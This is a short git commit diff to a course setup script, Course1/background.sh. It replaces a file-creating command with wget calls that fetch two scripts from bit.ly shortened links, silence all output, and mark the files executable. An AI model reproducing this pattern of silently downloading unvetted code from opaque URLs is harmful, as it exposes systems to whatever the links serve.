40cbc0429cee5a622d66ac0a58e47670774af645
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-24 20:32:34 +0700

    Update background.sh

--- Course1/background.sh
+++ Course1/background.sh
@@ -1,3 +1,6 @@
 #!/bin/bash
 
-touch /root/createdFromBackgroundScript
+wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
+wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
+chmod +x exit.sh
+chmod +x sleep.sh
